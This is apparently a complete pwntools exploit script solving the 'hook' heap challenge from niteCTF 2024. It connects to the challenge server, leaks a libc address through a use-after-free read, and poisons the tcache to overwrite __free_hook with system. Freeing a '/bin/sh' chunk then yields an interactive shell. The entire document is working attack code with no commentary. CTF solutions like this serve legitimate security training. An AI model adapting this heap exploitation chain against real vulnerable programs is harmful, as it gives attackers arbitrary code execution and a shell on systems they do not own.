#!/usr/bin/env python3


from pwn import *



e = ELF("./hook")
#r = process("./hook")
r = remote("hook-the-world.chals.nitectf2024.live",1337,ssl=True)
libc = ELF("./libc.so.6")

def create_chest(index,size):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"Chest number:",f"{index}")
    r.sendlineafter(b"Chest size:",f"{size}")
def free_chest(index):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Idiot crew memebr #:",f"{index}")
def view_chest(index):
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"Chest no:",f"{index}")
def write_chest(index,contents):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b">",f"{index}")
    r.sendline(contents)


for i in range(0,8):
    create_chest(i,0x90)
create_chest(8,0x20)
write_chest(8,b"/bin/sh\x00")
for i in range(0,8):
    free_chest(i)
view_chest(7)
libc_base = u64(r.recvline()[0:8].decode('latin-1').ljust(8,'\x00')) - 0x3ebca0
log.info("The libc base of the process is " + hex(libc_base))
free_hook = libc_base + libc.sym.__free_hook
write_chest(6,p64(free_hook) * 2)
create_chest(9,0x90)
create_chest(10,0x90)
write_chest(10,p64(libc_base + libc.sym.system))
free_chest(8)
r.interactive()
